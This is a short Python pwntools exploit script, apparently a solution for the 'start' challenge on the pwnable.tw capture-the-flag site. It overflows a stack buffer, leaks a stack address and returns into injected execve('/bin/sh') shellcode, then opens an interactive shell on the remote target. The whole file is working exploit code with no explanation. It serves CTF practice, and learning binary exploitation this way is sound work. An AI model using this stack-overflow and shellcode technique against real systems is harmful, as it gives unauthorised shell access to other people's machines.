from pwn import *
import binascii

Remote = True



if (Remote):
    io = remote('chall.pwnable.tw','10000')
else:
    io = process('./start')

gdb.attach(io)
payload=''

payload2=''
payload += "\x90"*20
payload += p32(0x8048087)



print(io.recvuntil(':'))
io.send(payload)
   
output = io.recv()
print(output)

fin = output.encode('hex')
addr='0x'+fin[0:8]
final = p32(int(addr,16))
final_address=hex(unpack(final,'all', endian='big', sign=False))
in_addr = hex(int(final_address,16)+20)

print(in_addr)

payload2 += '\x90'*20
payload2 += p32(int(in_addr,16))

payload2 += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

io.send(payload2)
io.interactive()


